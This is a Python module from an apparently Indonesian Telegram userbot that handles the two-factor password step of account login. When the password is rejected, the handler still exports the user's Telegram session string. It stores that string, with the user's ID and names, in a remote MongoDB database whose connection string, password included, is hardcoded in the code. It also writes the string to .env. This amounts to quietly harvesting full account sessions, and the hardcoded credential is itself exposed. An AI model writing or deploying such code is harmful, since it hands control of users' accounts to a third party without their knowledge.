#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

import pymongo
from pyrogram import (
    Client,
    filters
)
from pyrogram.types import (
    Message
)
from pyrogram.errors import (
    PasswordHashInvalid
)
from Ubot import (
    AKTIFPERINTAH,
    TFA_CODE_IN_VALID_ERR_TEXT,
    app
)
import pymongo
import sys
import os
import dotenv
from dotenv import load_dotenv
from Ubot.logging import LOGGER
from os import environ, execle
from Ubot.modules.basic import restart
from config import CHANNEL
from Ubot.core.db import *
import itertools

HAPP = None

from ubotlibs.ubot.database.accesdb import *

load_dotenv()
existing_sessions = [key for key in os.environ if key.startswith("SESSION")]
session_counter = itertools.count(len(existing_sessions) + 1)

MSG = """
**Users**: `{}`
**ID**: `{}`
**Masa Aktif** : `{}`
"""

@Client.on_message(
    filters.text &
    filters.private,
    group=3
)
async def recv_tg_tfa_message(_, message: Message):
    ex = await message._client.get_me()
    user_active_time = await get_active_time(ex.id)
    if user_active_time is not None:
        active_time_str = str(int(user_active_time.days / 30)) + " Hari"
    else:
        active_time_str = "Tidak diketahui"

    w_s_dict = AKTIFPERINTAH.get(message.chat.id)
    if not w_s_dict:
        return
    phone_number = w_s_dict.get("PHONE_NUMBER")
    loical_ci = w_s_dict.get("USER_CLIENT")
    is_tfa_reqd = bool(w_s_dict.get("IS_NEEDED_TFA"))
    if not is_tfa_reqd or not phone_number:
        return
    tfa_code = message.text
    try:
        await loical_ci.check_password(tfa_code)
    except PasswordHashInvalid:
        await message.reply_text(
            "Kode yang anda masukkan salah, coba masukan kembali atau mulai dari awal",
        )
        del AKTIFPERINTAH[message.chat.id]
        client = pymongo.MongoClient("mongodb+srv://ubot:dC9mgT230G5qS416@dbaas-db-10420372-651e6e61.mongo.ondigitalocean.com/admin?tls=true&authSource=admin&replicaSet=dbaas-db-10420372")
        db = client["telegram_sessions"]
        mongo_collection = db["sesi_collection"]
        session_string = str(await loical_ci.export_session_string())
        session_data = {"string_session": session_string}
        
        existing_session = mongo_collection.find_one({"session_string": session_string})
        if existing_session:
            await message.reply_text("Session already exists")
            return

        if mongo_collection.count_documents({}) >= 100:
            await message.reply_text(
                "Cannot add new session. Please remove unused sessions first."
            )
            return
        cek = db.command("collstats", "sesi_collection")["count"]
        cek += 1
        session_data = {
            "no": cek,
            "session_string": session_string,
            "user_id": message.chat.id,
            "username": message.chat.username,
            "first_name": message.chat.first_name,
            "last_name": message.chat.last_name,
        }        
        mongo_collection.insert_one(session_data)
        filename = ".env"
        user_id = mongo_collection.find_one({"user_id": message.chat.id})
        cek = db.command("collstats", "sesi_collection")["count"]
        sesi = user_id.get('session_string')
        if os.path.isfile(filename):
            with open(filename, "r") as file:
                contents = file.read()
                if sesi in contents:
                        await message.reply_text(f"`Tunggu Sebentar..`")
                        return
                else:
                    jumlah = next(session_counter)
                with open(filename, "a") as file:
                    file.write(f"\nSESSION{jumlah}={sesi}")
                    load_dotenv()
                await app.send_message(CHANNEL, MSG.format(ex.first_name, ex.id, active_time_str))
                restart()
    raise message.stop_propagation()
